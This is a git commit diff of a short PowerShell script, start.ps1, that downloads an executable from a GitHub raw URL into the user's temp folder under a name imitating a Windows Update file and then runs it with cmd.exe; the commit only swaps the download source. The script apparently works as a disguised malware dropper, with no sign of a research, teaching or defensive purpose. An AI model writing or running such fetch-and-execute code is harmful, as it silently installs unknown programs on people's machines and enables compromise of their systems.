06e89ac8ac6172044cf96cbd0bb4361376d1f0fe
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-11 20:17:02 -0600

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,3 +1,3 @@
 New-Item "$env:temp\wsuA58F.tmp"
-(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\wsuA58F.exe")
+(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
 cmd.exe /c "$env:temp\wsuA58F.exe"
